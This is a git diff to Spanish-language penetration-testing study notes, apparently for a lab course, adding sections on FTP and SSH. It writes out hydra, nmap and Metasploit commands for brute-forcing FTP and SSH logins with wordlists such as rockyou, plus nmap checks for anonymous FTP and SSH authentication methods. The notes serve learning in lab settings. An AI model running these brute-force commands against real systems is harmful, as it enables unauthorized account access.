@@ -13,7 +13,7 @@
   - [SMB: Dictionary attack](#smb-dictionary-attack)
     - [Con Metasploid](#con-metasploid)
     - [Con Hydra](#con-hydra)
-    
+
 ---
 
 # Introduccion
@@ -200,6 +200,8 @@ Es un protocolo utilizado para transferencias de archivo (Como dice su nombre), 
 
 Para conectarnos se usa el comando `ftp "IP"`.
 
+## FTP si no tenemos usuario o password
+
 Si no nos deja conectarnos sin poner usuario ni contraseña podemos por ejemplo probar la fuerza bruta con `hydra`:
 
 `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt "IP" ftp`
@@ -207,3 +209,50 @@ Si no nos deja conectarnos sin poner usuario ni contraseña podemos por ejemplo 
 Si sabemos un usuario tambien podemos probar fuerza bruta con nmap:
 
 `nmap "ip" --script=ftp-brute --script-args userdb="usuario o fichero con usarios" -p21`
+
+## FTP Anonymous Login
+
+Algunos servidores FTP tienen una vulnerabilidad que permite loguearse anonimamente.
+
+Podemos comprobarlo con el siguiente comando **nmap**:
+
+`nmap "IP" -p21 --script=ftp-anon`
+
+---
+---
+
+# SSH (Secure Shell)
+
+Es un protocolo que se usa para administracion remota y te otorga una secure shell por una conexion encriptada.
+
+Para conectarse a una maquina con este protocolo se usa el siguiente comando: `ssh usuario@"IP"`, por ejemplo:
+
+`ssh root@192.244.143.3`
+
+## SSH: Obtener informacion del servidor 
+
+
+
+- `nmap "IP" -p22 --script=ssh2-enum-algos` --> con este comando obtenemos todos los algoritmos diponibles relacionados.
+
+- `nmap "IP" -p22 --script=ssh-hostkey --script-args ssh_hostkey=full` --> con este comando obtenemos la clave RSA del servidor ssh, nos será util mas adelante.
+
+- `nmap "IP" -p22 --script=ssh-auth-methods --script-args="ssh.user=student"` --> obtenemos que metodos de autenticacion sporta un usuario en espedifico, si no soporta ninguno es probable que podamos conectar sin contraseña (si el usuario existe).
+
+## SSH: Ataque de diccionario
+
+Es muy parecido al resto de ataques de diccionario.
+
+- Podemos usar Hydra:
+
+    `hydra -l "login que queremos atacar" -P /usr/share/wordlists/rockyou.txt "IP" "Protocolo"` 
+
+    - Ejemplo:
+
+        `hydra -l student -P /usr/share/wordlists/rockyou.txt 192.141.55.3 ssh` 
+![hydra](img/hydra-ssh-1.png)
+- Tambien podemos usar NMAP como en el siguiente ejemplo:
+
+    `nmap 192.141.55.3 -p22 --script ssh-brute --script-args userdb=/root/user`
+
+- Tambien podemos usar nuestro amigo metasploit con el   siguiente exploit: `auxiliary/scanner/ssh/ssh_login` , tendremos que informar el diccionario y e usuario
